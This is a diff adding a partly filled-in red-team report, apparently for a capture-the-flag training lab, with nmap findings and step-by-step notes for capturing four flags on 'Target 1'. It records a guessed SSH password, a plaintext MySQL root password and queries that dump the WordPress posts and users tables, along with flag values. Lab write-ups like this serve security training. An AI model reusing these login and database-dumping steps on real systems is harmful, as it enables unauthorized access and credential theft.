@@ -1,0 +1,60 @@
+# Red Team: Summary of Operations
+
+## Table of Contents
+- Exposed Services
+- Critical Vulnerabilities
+- Exploitation
+
+### Exposed Services
+_TODO: Fill out the information below._
+
+Nmap scan results for each machine reveal the below services and OS details:
+
+```bash
+$ nmap -sV 192.168.1.1/24
+
+This scan identifies the services below as potential points of entry:
+1. Port 22/TCP Open SSH 
+2. Port 80/TCP Open HTTP 
+3. Port 111/TCP Open rcpbind 
+4. Port 139/TCP Open netbios-ssn 
+5. Port 445/TCP Open netbios-ssn 
+
+The following vulnerabilities were identified on each target:
+Target 1
+   1. Wordpress site (user enumeration)
+   2. Weak password
+   3. Unsalted password hashes
+   4. Incorrect User privileges or privilege escalation
+
+### Exploitation
+
+The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
+- Target 1
+  - `flag1.txt`: 
+    - **Exploit Used**
+      - _TODO: manual brute force attack   password = michael
+     1.ssh michael@192.168.1.110
+     2. cd /var/www/html
+     3. ls -l
+     4. nano service.html
+  - `flag2.txt`:fc3fd58dcdad9ab23faca6e9a36e581c
+    - **Exploit Used**
+      - _TODO:same as flag 1
+      1.ssh michael@192.168.1.110
+     2. cd /var/www
+     3. ls -l
+    4. cat flag2.txt
+  - Flag3: afc01ab56b50591e7dccf93122770cd2
+    1. mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1
+    2.show databases;
+    3.use wordpress;
+    4.show tables;
+    5.select * from wp_posts;
+  -Flag4: 715dea6c055b9fe3337544932f2941ce 
+    1.mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1
+    2.show databases;
+    3.use wordpress;
+    4.show tables;
+    5.select * from wp_users;
+
